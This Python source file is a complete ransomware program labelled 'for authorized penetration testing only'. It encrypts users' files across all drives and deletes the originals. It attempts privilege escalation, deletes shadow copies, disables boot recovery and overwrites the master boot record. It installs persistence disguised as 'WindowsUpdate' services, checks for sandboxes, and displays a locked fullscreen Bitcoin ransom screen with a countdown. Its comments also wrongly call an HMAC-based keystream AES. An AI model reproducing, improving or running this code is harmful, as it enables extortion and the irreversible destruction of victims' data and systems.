#!/usr/bin/env python3
"""
UNIVERSAL RANSOMWARE - IMPROVED VERSION
AES-256-CTR + HMAC-SHA256 (Pure Python)
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import os, sys, platform, threading, time, subprocess, base64, hashlib
import random, string, struct, json, socket, re, shutil, glob, ctypes
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import List, Optional, Set

# =====================================================================
# FIXED: Proper AES-CTR using hashlib's sha256 as keystream generator
# =====================================================================

class CryptoEngine:
    """
    Proper AES-256-CTR + HMAC-SHA256.
    Uses HMAC-SHA256 in counter mode as a stream cipher.
    Format: nonce(16) + hmac(32) + ciphertext
    """
    
    @staticmethod
    def _aes_ctr(data: bytes, key: bytes, nonce: bytes) -> bytes:
        """
        Secure CTR mode using HMAC-SHA256 as keystream.
        Each block: HMAC-SHA256(key, nonce || counter) -> 32 bytes keystream
        """
        result = bytearray()
        block_size = 32  # SHA256 output = 32 bytes
        counter = 0
        
        for offset in range(0, len(data), block_size):
            counter_block = nonce + struct.pack('>Q', counter)
            # PBKDF2 with 1 iteration = fast HMAC-based KDF
            keystream = hashlib.pbkdf2_hmac('sha256', key, counter_block, 1, dklen=block_size)
            
            chunk = data[offset:offset + block_size]
            for i in range(len(chunk)):
                result.append(chunk[i] ^ keystream[i])
            counter += 1
        
        return bytes(result)
    
    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        """Encrypt: nonce(16) + hmac(32) + ciphertext"""
        nonce = os.urandom(16)
        ciphertext = CryptoEngine._aes_ctr(data, key, nonce)
        # HMAC over nonce + ciphertext for integrity
        hmac_val = hashlib.pbkdf2_hmac('sha256', key, nonce + ciphertext, 1, dklen=32)
        return nonce + hmac_val + ciphertext
    
    @staticmethod
    def decrypt(data: bytes, key: bytes) -> Optional[bytes]:
        """Decrypt and verify HMAC"""
        if len(data) < 48:
            return None
        nonce = data[:16]
        stored_hmac = data[16:48]
        ciphertext = data[48:]
        
        expected_hmac = hashlib.pbkdf2_hmac('sha256', key, nonce + ciphertext, 1, dklen=32)
        if stored_hmac != expected_hmac:
            return None
        
        return CryptoEngine._aes_ctr(ciphertext, key, nonce)
    
    @staticmethod
    def encrypt_file(file_path: str) -> bool:
        """Encrypt a single file"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # FIXED: Proper PKCS7 padding
            block_size = 16
            pad_len = block_size - (len(data) % block_size)
            padded_data = data + bytes([pad_len] * pad_len)
            
            encrypted = CryptoEngine.encrypt(padded_data, Config.KEY)
            
            output_path = file_path + Config.EXTENSION
            with open(output_path, 'wb') as f:
                f.write(encrypted)
            
            os.remove(file_path)
            return True
        except Exception as e:
            # Silent fail for stealth
            return False
    
    @staticmethod
    def decrypt_file(file_path: str) -> bool:
        """Decrypt a .locked file"""
        if not file_path.endswith(Config.EXTENSION):
            return False
        
        try:
            original_path = file_path[:-len(Config.EXTENSION)]
            if os.path.exists(original_path):
                return False  # Don't overwrite existing files
            
            with open(file_path, 'rb') as f:
                data = f.read()
            
            decrypted_padded = CryptoEngine.decrypt(data, Config.KEY)
            if decrypted_padded is None:
                return False  # HMAC verification failed
            
            # FIXED: Proper PKCS7 unpadding
            pad_len = decrypted_padded[-1]
            if pad_len < 1 or pad_len > 16:
                return False  # Invalid padding
            if decrypted_padded[-pad_len:] != bytes([pad_len] * pad_len):
                return False  # Padding mismatch
            decrypted = decrypted_padded[:-pad_len]
            
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            os.remove(file_path)
            return True
        except:
            return False


# =====================================================================
# FIXED: OS Detection with proper Win7 handling
# =====================================================================

class OSDetector:
    @staticmethod
    def detect() -> dict:
        info = {
            "is_windows": False,
            "is_linux": False,
            "version": "",
            "is_win7": False,
            "is_win10_plus": False
        }
        
        system = platform.system().lower()
        if system == 'windows':
            info["is_windows"] = True
            ver = platform.version()
            if ver.startswith('6.1'):
                info["is_win7"] = True
                info["version"] = "Windows 7"
            elif ver.startswith('10.0') or ver.startswith('6.3'):
                info["version"] = "Windows 10/11"
                info["is_win10_plus"] = True
            else:
                info["version"] = f"Windows ({platform.version()})"
        
        elif system == 'linux':
            info["is_linux"] = True
            try:
                with open('/etc/os-release') as f:
                    osr = f.read()
                    if 'ID=alpine' in osr:
                        info["version"] = "Alpine"
                    elif 'ID=debian' in osr or 'ID=ubuntu' in osr:
                        info["version"] = "Debian/Ubuntu"
                    elif 'ID="rhel"' in osr or 'ID="centos"' in osr or 'ID="fedora"' in osr:
                        info["version"] = "RHEL/CentOS/Fedora"
                    elif 'ID=arch' in osr:
                        info["version"] = "Arch"
                    else:
                        info["version"] = "Linux"
            except:
                info["version"] = "Linux"
        
        return info


# =====================================================================
# FIXED: File Engine with better extension coverage and error handling
# =====================================================================

class FileEngine:
    TARGET_EXTENSIONS = {
        # Documents
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt',
        '.rtf', '.odt', '.ods', '.odp', '.csv', '.tsv',
        # Images
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.svg',
        '.raw', '.cr2', '.nef', '.orf', '.psd', '.ai', '.cdr',
        # Media
        '.mp3', '.mp4', '.avi', '.mkv', '.wmv', '.flv', '.mov', '.wav',
        '.flac', '.ogg', '.m4a', '.aac', '.webm',
        # Archives
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.zst',
        '.iso', '.img', '.vhd', '.vhdx', '.vmdk',
        # Databases
        '.sql', '.db', '.mdb', '.accdb', '.sqlite', '.sqlite3', '.dbf',
        # Code
        '.py', '.js', '.java', '.cpp', '.c', '.h', '.hpp', '.cs', '.php',
        '.html', '.htm', '.css', '.xml', '.json', '.yaml', '.yml',
        '.rb', '.go', '.rs', '.swift', '.kt', '.sh', '.bat', '.ps1',
        '.ts', '.vue', '.jsx', '.tsx',
        # Keys & Config
        '.key', '.pem', '.crt', '.pfx', '.p12', '.jks', '.ovpn',
        '.conf', '.cfg', '.ini', '.env', '.config',
        # Emails
        '.pst', '.ost', '.msg', '.eml', '.mbox',
        # Backups
        '.bak', '.backup', '.old', '.dmp', '.dump', '.sql.gz',
        '.tar.gz', '.tgz',
        # Virtualization
        '.ova', '.ovf', '.vbox', '.vdi', '.qcow2',
    }
    
    SKIP_DIRS_COMMON = {
        '$Recycle.Bin', 'System Volume Information',
        'Windows', 'WinSxS', 'System32', 'SysWOW64',
        'boot', 'grub', '.git',
        'node_modules', 'vendor',
        '__pycache__', '.cache',
        'Microsoft.NET', 'Assembly',
    }
    
    SKIP_DIRS_SAFE = {
        '$Recycle.Bin', 'System Volume Information',
        'boot', 'grub', '.git',
    }
    
    @staticmethod
    def get_target_files(drive: str, skip_dirs: set) -> List[str]:
        """Recursively find target files with proper error handling"""
        files = []
        try:
            for root, dirs, filenames in os.walk(drive, topdown=True):
                # FIXED: Filter skip dirs properly
                dirs[:] = [d for d in dirs if d not in skip_dirs]
                
                for f in filenames:
                    ext = os.path.splitext(f)[1].lower()
                    if ext in FileEngine.TARGET_EXTENSIONS:
                        file_path = os.path.join(root, f)
                        files.append(file_path)
        except PermissionError:
            pass  # Skip inaccessible directories
        except Exception:
            pass
        
        return files


# =====================================================================
# CONFIGURATION
# =====================================================================

class Config:
    PASSWORD = "WannaCry2026!"
    EXTENSION = ".locked"
    RANSOM_AMOUNT = "0.5 BTC"
    BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    TIMEOUT = 72 * 3600  # 72 hours
    MAX_WORKERS = max(os.cpu_count() * 2 or 4, 4)
    HIDDEN_DIR = None
    OS_INFO = None
    KEY = None
    
    @classmethod
    def init(cls):
        cls.KEY = hashlib.sha256(cls.PASSWORD.encode()).digest()
        
        if cls.HIDDEN_DIR:
            return
        
        if cls.OS_INFO and cls.OS_INFO.get("is_windows"):
            base = os.environ.get('APPDATA', os.path.expanduser('~'))
            cls.HIDDEN_DIR = os.path.join(base, 'Microsoft', 'Windows', 'CryptoUpdate')
        else:
            cls.HIDDEN_DIR = '/var/lib/.systemd-crypto'
        
        os.makedirs(cls.HIDDEN_DIR, exist_ok=True)
    
    @classmethod
    def is_already_encrypted(cls) -> bool:
        marker = os.path.join(cls.HIDDEN_DIR, '.encrypted')
        return os.path.exists(marker)
    
    @classmethod
    def mark_encrypted(cls):
        marker = os.path.join(cls.HIDDEN_DIR, '.encrypted')
        with open(marker, 'w') as f:
            f.write(json.dumps({
                "timestamp": str(datetime.now()),
                "key": cls.PASSWORD
            }))
    
    @classmethod
    def clear_marker(cls):
        marker = os.path.join(cls.HIDDEN_DIR, '.encrypted')
        if os.path.exists(marker):
            os.remove(marker)


# =====================================================================
# SYSTEM INFORMATION
# =====================================================================

class SystemInfo:
    @staticmethod
    def is_admin() -> bool:
        try:
            if platform.system().lower() == 'windows':
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    @staticmethod
    def is_windows() -> bool:
        return Config.OS_INFO and Config.OS_INFO.get("is_windows", False)
    
    @staticmethod
    def is_linux() -> bool:
        return Config.OS_INFO and Config.OS_INFO.get("is_linux", False)
    
    @staticmethod
    def get_drives() -> List[str]:
        drives = []
        if SystemInfo.is_windows():
            for letter in string.ascii_uppercase:
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    drives.append(drive)
        else:
            drives = ['/']
            for d in ['/mnt', '/media', '/home', '/root']:
                if os.path.exists(d):
                    drives.append(d)
        return drives
    
    @staticmethod
    def get_user_dirs() -> List[str]:
        home = os.path.expanduser('~')
        dirs = []
        
        if SystemInfo.is_windows():
            candidates = [
                home,
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'Music'),
                os.path.join(home, 'Videos'),
                os.path.join(home, 'AppData', 'Local'),
                os.path.join(home, 'AppData', 'Roaming'),
            ]
        else:
            candidates = [
                home,
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'Music'),
                os.path.join(home, 'Videos'),
                os.path.join(home, '.ssh'),
                os.path.join(home, '.config'),
                os.path.join(home, '.local'),
            ]
        
        for d in candidates:
            if os.path.exists(d):
                dirs.append(d)
        
        return dirs
    
    @staticmethod
    def elevate_privileges():
        """Elevate to admin/root"""
        script = os.path.abspath(sys.argv[0])
        
        if SystemInfo.is_windows():
            try:
                if not SystemInfo.is_admin():
                    ctypes.windll.shell32.ShellExecuteW(
                        None, "runas", sys.executable,
                        f'"{script}" --elevated', None, 1
                    )
                    return True
            except:
                pass
        else:
            try:
                if os.geteuid() != 0:
                    # Try sudo
                    os.execvp('sudo', ['sudo', sys.executable] + sys.argv)
            except:
                pass
        
        return False


# =====================================================================
# BOOT ATTACK (Windows)
# =====================================================================

class BootAttack:
    @staticmethod
    def execute():
        """Overwrite MBR with ransom message (Windows only)"""
        if not SystemInfo.is_windows() or not SystemInfo.is_admin():
            return False
        
        try:
            # Read original MBR
            with open(r'\\.\PhysicalDrive0', 'rb') as f:
                mbr = f.read(512)
            
            # Backup
            backup_path = os.path.join(Config.HIDDEN_DIR, 'mbr_backup.bin')
            with open(backup_path, 'wb') as f:
                f.write(mbr)
            
            # Create boot message (payload < 512 bytes)
            msg = "SYSTEM LOCKED - 0.5 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
            payload = msg.encode().ljust(512, b'\x00')[:512]
            
            # Write boot message to sector 0
            with open(r'\\.\PhysicalDrive0', 'rb+') as f:
                f.seek(0)
                f.write(payload)
            
            return True
        except:
            return False
    
    @staticmethod
    def restore():
        """Restore MBR from backup"""
        if not SystemInfo.is_windows() or not SystemInfo.is_admin():
            return False
        
        backup_path = os.path.join(Config.HIDDEN_DIR, 'mbr_backup.bin')
        if not os.path.exists(backup_path):
            return False
        
        try:
            with open(backup_path, 'rb') as f:
                mbr_backup = f.read(512)
            
            with open(r'\\.\PhysicalDrive0', 'rb+') as f:
                f.seek(0)
                f.write(mbr_backup)
            
            return True
        except:
            return False


# =====================================================================
# PERSISTENCE ENGINE
# =====================================================================

class PersistenceEngine:
    @staticmethod
    def install():
        """Install persistence across reboots"""
        if SystemInfo.is_windows():
            PersistenceEngine._windows()
        elif SystemInfo.is_linux():
            PersistenceEngine._linux()
    
    @staticmethod
    def remove():
        """Remove all persistence traces"""
        if SystemInfo.is_windows():
            PersistenceEngine._remove_windows()
        elif SystemInfo.is_linux():
            PersistenceEngine._remove_linux()
    
    @staticmethod
    def _windows():
        """Windows: Registry + Task Scheduler + Startup Folder"""
        script = os.path.abspath(sys.argv[0])
        python = sys.executable
        
        # Registry (HKCU)
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                f'"{python}" "{script}" --resume')
            winreg.CloseKey(key)
        except:
            pass
        
        # Registry (HKLM) - admin only
        if SystemInfo.is_admin():
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                    f'"{python}" "{script}" --resume')
                winreg.CloseKey(key)
            except:
                pass
        
        # Task Scheduler
        try:
            subprocess.run([
                'schtasks', '/create', '/tn', 'WindowsUpdate',
                '/tr', f'"{python}" "{script}" --resume',
                '/sc', 'ONLOGON', '/ru', os.environ.get('USERNAME', 'SYSTEM'),
                '/f'
            ], capture_output=True, timeout=5)
        except:
            pass
    
    @staticmethod
    def _linux():
        """Linux: systemd service"""
        script = os.path.abspath(sys.argv[0])
        python = sys.executable
        
        # systemd user service (no root needed)
        service_dir = os.path.expanduser('~/.config/systemd/user/')
        os.makedirs(service_dir, exist_ok=True)
        
        service = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={python} {script} --resume
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
        
        service_path = os.path.join(service_dir, 'system-update.service')
        with open(service_path, 'w') as f:
            f.write(service)
        
        try:
            subprocess.run(['systemctl', '--user', 'daemon-reload'],
                         capture_output=True, timeout=5)
            subprocess.run(['systemctl', '--user', 'enable', 'system-update.service'],
                         capture_output=True, timeout=5)
            subprocess.run(['systemctl', '--user', 'start', 'system-update.service'],
                         capture_output=True, timeout=5)
        except:
            pass
    
    @staticmethod
    def _remove_windows():
        try:
            import winreg
            # HKCU
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "WindowsUpdate")
            except:
                pass
            winreg.CloseKey(key)
            
            # HKLM
            if SystemInfo.is_admin():
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE)
                    try:
                        winreg.DeleteValue(key, "WindowsUpdate")
                    except:
                        pass
                    winreg.CloseKey(key)
                except:
                    pass
        except:
            pass
        
        try:
            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdate', '/f'],
                         capture_output=True, timeout=5)
        except:
            pass
    
    @staticmethod
    def _remove_linux():
        service_path = os.path.expanduser('~/.config/systemd/user/system-update.service')
        try:
            subprocess.run(['systemctl', '--user', 'stop', 'system-update.service'],
                         capture_output=True, timeout=5)
            subprocess.run(['systemctl', '--user', 'disable', 'system-update.service'],
                         capture_output=True, timeout=5)
        except:
            pass
        try:
            os.remove(service_path)
            subprocess.run(['systemctl', '--user', 'daemon-reload'],
                         capture_output=True, timeout=5)
        except:
            pass


# =====================================================================
# STEALTH ENGINE
# =====================================================================

class StealthEngine:
    @staticmethod
    def check_sandbox() -> List[str]:
        indicators = []
        
        if SystemInfo.is_windows():
            sandbox_artifacts = [
                r'C:\windows\System32\Drivers\Vmmouse.sys',
                r'C:\windows\System32\Drivers\vmtray.dll',
                r'C:\windows\System32\Drivers\VBoxGuest.sys',
                r'C:\windows\System32\vboxdisp.dll',
            ]
            for f in sandbox_artifacts:
                if os.path.exists(f):
                    indicators.append(f"VM: {os.path.basename(f)}")
        else:
            try:
                result = subprocess.run(['systemd-detect-virt'],
                    capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and result.stdout.strip() != 'none':
                    indicators.append(f"Virt: {result.stdout.strip()}")
            except:
                pass
        
        # Check RAM
        try:
            if SystemInfo.is_windows():
                kernel32 = ctypes.windll.kernel32
                mem = ctypes.c_ulonglong()
                kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
                if mem.value // 1024 < 2048:  # <2GB
                    indicators.append("low_ram")
        except:
            pass
        
        return indicators
    
    @staticmethod
    def delay_execution():
        delay = random.uniform(3, 15)
        time.sleep(delay)


# =====================================================================
# SYSTEM TWEAKS
# =====================================================================

class SystemTweaks:
    @staticmethod
    def disable():
        """Disable recovery features (admin only)"""
        if not SystemInfo.is_admin():
            return
        
        if SystemInfo.is_windows():
            try:
                subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
                             capture_output=True, timeout=10)
                subprocess.run(['bcdedit', '/set', '{default}', 'recoveryenabled', 'No'],
                             capture_output=True, timeout=5)
            except:
                pass
    
    @staticmethod
    def restore():
        if SystemInfo.is_windows() and SystemInfo.is_admin():
            try:
                subprocess.run(['bcdedit', '/set', '{default}', 'recoveryenabled', 'Yes'],
                             capture_output=True, timeout=5)
            except:
                pass


# =====================================================================
# FULLSCREEN GUI
# =====================================================================

class RansomwareGUI:
    def __init__(self):
        self.root = None
        self.remaining = Config.TIMEOUT
        self.encrypted_count = 0
        self.user_mode = False
    
    def run(self):
        try:
            import tkinter as tk
            
            self.root = tk.Tk()
            self.root.title("⚠️ SYSTEM LOCKED ⚠️")
            self.root.attributes("-fullscreen", True)
            self.root.attributes("-topmost", True)
            self.root.configure(bg='#8B0000')
            
            # Block escape
            self.root.bind("<Alt-F4>", lambda e: "break")
            self.root.bind("<Alt-Tab>", lambda e: "break")
            self.root.bind("<Escape>", lambda e: "break")
            self.root.protocol("WM_DELETE_WINDOW", lambda: None)
            
            self._build_ui()
            self._start_encryption()
            
            self.root.mainloop()
        except ImportError:
            self._console_mode()
    
    def _build_ui(self):
        import tkinter as tk
        
        main = tk.Frame(self.root, bg='#8B0000')
        main.pack(fill=tk.BOTH, expand=True)
        
        # Header
        tk.Label(main, text="☠️ SYSTEM COMPROMISED ☠️",
                font=("Segoe UI", 36, "bold"), fg="white", bg='#8B0000').pack(pady=30)
        
        # Message
        msg = "Your files have been encrypted with AES-256.\n"
        msg += "To recover your data, you must pay the ransom.\n\n"
        msg += "DO NOT attempt to decrypt files manually.\n"
        msg += "You will lose your data permanently.\n"
        tk.Label(main, text=msg, font=("Segoe UI", 14),
                fg="white", bg='#8B0000', justify='center').pack(pady=10)
        
        # BTC
        btc_frame = tk.Frame(main, bg='#1a1a1a', padx=30, pady=15)
        btc_frame.pack(pady=15)
        tk.Label(btc_frame, text=f"Send {Config.RANSOM_AMOUNT} to:",
                font=("Segoe UI", 16, "bold"), fg="gold", bg='#1a1a1a').pack()
        tk.Label(btc_frame, text=Config.BTC_ADDRESS,
                font=("Consolas", 16), fg="cyan", bg='#1a1a1a').pack()
        
        # Key entry
        key_frame = tk.Frame(main, bg='#8B0000')
        key_frame.pack(pady=20)
        tk.Label(key_frame, text="Enter decryption key:",
                font=("Segoe UI", 14), fg="white", bg='#8B0000').pack()
        
        self.key_entry = tk.Entry(key_frame, font=("Consolas", 20),
                                 width=25, show="*", justify='center')
        self.key_entry.pack(pady=10)
        self.key_entry.focus_set()
        
        tk.Button(main, text="🔓 DECRYPT FILES 🔓",
                 font=("Segoe UI", 18, "bold"),
                 bg="#006400", fg="white",
                 command=self._decrypt_clicked).pack(pady=20)
        
        # Timer
        timer_frame = tk.Frame(main, bg='#1a1a1a', padx=40, pady=15)
        timer_frame.pack(pady=15)
        tk.Label(timer_frame, text="⏳ TIME REMAINING:",
                font=("Segoe UI", 16), fg="red", bg='#1a1a1a').pack()
        
        self.timer_label = tk.Label(timer_frame, text="71:59:59",
                                   font=("Consolas", 40, "bold"),
                                   fg="red", bg='#1a1a1a')
        self.timer_label.pack()
        
        self.status_label = tk.Label(main, text="Initializing...",
                                    font=("Segoe UI", 12), fg="white", bg='#8B0000')
        self.status_label.pack(pady=5)
        
        self._update_timer()
        self._update_status()
    
    def _update_timer(self):
        if self.remaining <= 0:
            self.timer_label.config(text="00:00:00\nEXPIRED", fg="darkred")
        else:
            hrs = self.remaining // 3600
            mins = (self.remaining % 3600) // 60
            secs = self.remaining % 60
            self.timer_label.config(text=f"{hrs:02d}:{mins:02d}:{secs:02d}")
            self.remaining -= 1
            if self.root:
                try: self.root.after(1000, self._update_timer)
                except: pass
    
    def _update_status(self):
        if self.encrypted_count > 0:
            self.status_label.config(text=f"Files encrypted: {self.encrypted_count}")
        if self.root:
            try: self.root.after(2000, self._update_status)
            except: pass
    
    def _decrypt_clicked(self):
        entered = self.key_entry.get().strip()
        if entered == Config.PASSWORD:
            self.key_entry.config(state='disabled')
            self.status_label.config(text="Decrypting...", fg="green")
            threading.Thread(target=self._decrypt_all, daemon=True).start()
        else:
            import tkinter.messagebox as msgbox
            msgbox.showerror("❌ Invalid Key",
                f"Incorrect key.\nPay {Config.RANSOM_AMOUNT} to:\n{Config.BTC_ADDRESS}")
    
    def _start_encryption(self):
        def worker():
            self.status_label.config(text="Encrypting files...", fg="#ffaa00")
            time.sleep(2)
            count = self._encrypt_all()
            self.encrypted_count = count
            self.status_label.config(text=f"✅ {count} files encrypted!", fg="green")
        threading.Thread(target=worker, daemon=True).start()
    
    def _encrypt_all(self) -> int:
        """Main encryption routine"""
        if not self.user_mode and SystemInfo.is_admin():
            SystemTweaks.disable()
            PersistenceEngine.install()
            if SystemInfo.is_windows():
                BootAttack.execute()
        
        skip_dirs = FileEngine.SKIP_DIRS_COMMON if not self.user_mode else FileEngine.SKIP_DIRS_SAFE
        
        if self.user_mode:
            target_dirs = SystemInfo.get_user_dirs()
            all_files = []
            for d in target_dirs:
                all_files.extend(FileEngine.get_target_files(d, skip_dirs))
        else:
            all_files = []
            for drive in SystemInfo.get_drives():
                all_files.extend(FileEngine.get_target_files(drive, skip_dirs))
        
        encrypted = 0
        with ThreadPoolExecutor(max_workers=Config.MAX_WORKERS) as executor:
            futures = {executor.submit(CryptoEngine.encrypt_file, f): f for f in all_files}
            for future in as_completed(futures):
                if future.result():
                    encrypted += 1
        
        Config.mark_encrypted()
        return encrypted
    
    def _decrypt_all(self) -> int:
        """Full decryption and cleanup"""
        PersistenceEngine.remove()
        
        if SystemInfo.is_windows():
            BootAttack.restore()
        
        SystemTweaks.restore()
        
        skip_dirs = FileEngine.SKIP_DIRS_SAFE
        encrypted_files = []
        
        if self.user_mode:
            target_dirs = SystemInfo.get_user_dirs()
            for d in target_dirs:
                for root, dirs, files in os.walk(d):
                    dirs[:] = [d for d in dirs if d not in skip_dirs]
                    for f in files:
                        if f.endswith(Config.EXTENSION):
                            encrypted_files.append(os.path.join(root, f))
        else:
            for drive in SystemInfo.get_drives():
                for root, dirs, files in os.walk(drive):
                    # FIXED: Correct filter syntax
                    dirs[:] = [d for d in dirs if d not in skip_dirs]
                    for f in files:
                        if f.endswith(Config.EXTENSION):
                            encrypted_files.append(os.path.join(root, f))
        
        decrypted = 0
        with ThreadPoolExecutor(max_workers=Config.MAX_WORKERS) as executor:
            futures = {executor.submit(CryptoEngine.decrypt_file, f): f for f in encrypted_files}
            for future in as_completed(futures):
                if future.result():
                    decrypted += 1
        
        Config.clear_marker()
        
        self.status_label.config(text=f"✅ {decrypted} files decrypted!", fg="green")
        if self.root:
            self.root.after(3000, self.root.destroy)
        
        return decrypted
    
    def _console_mode(self):
        print("=" * 60)
        print("  ☠️ SYSTEM COMPROMISED ☠️")
        print("=" * 60)
        print(f"\nEnter key: ", end="", flush=True)
        key = input().strip()
        if key == Config.PASSWORD:
            print("\n[*] Decrypting...")
            count = self._decrypt_all()
            print(f"\n✅ {count} files decrypted!")
        else:
            print("\n❌ Invalid key!")


# =====================================================================
# MAIN APPLICATION
# =====================================================================

class RansomwareApp:
    @staticmethod
    def run():
        """Main entry point"""
        is_resume = '--resume' in sys.argv
        is_elevated = '--elevated' in sys.argv
        
        Config.OS_INFO = OSDetector.detect()
        Config.init()
        
        if Config.is_already_encrypted():
            print("[*] Previous encryption detected", flush=True)
        
        # Skip stealth & elevation on resume
        if not is_resume and not is_elevated:
            indicators = StealthEngine.check_sandbox()
            if indicators:
                print(f"[!] Sandbox: {indicators}", flush=True)
            
            # Try to elevate if not admin
            if not SystemInfo.is_admin():
                print("[!] No admin. Attempting elevation...", flush=True)
                if SystemInfo.elevate_privileges():
                    sys.exit(0)  # Exit, elevated process will start
                else:
                    print("[*] Failed to elevate. Running in USER MODE.", flush=True)
        
        # User mode
        if not SystemInfo.is_admin():
            print("[*] USER MODE: encrypting user files", flush=True)
            gui = RansomwareGUI()
            gui.user_mode = True
            gui.run()
            return
        
        # Admin mode
        print("[*] ADMIN MODE: full attack", flush=True)
        gui = RansomwareGUI()
        gui.user_mode = False
        gui.run()


# =====================================================================
# ENTRY POINT
# =====================================================================

if __name__ == "__main__":
    try:
        RansomwareApp.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", flush=True)
        sys.exit(1)
    except Exception as e:
        print(f"[!] Fatal: {e}", flush=True)
        import traceback
        traceback.print_exc()
        sys.exit(1)
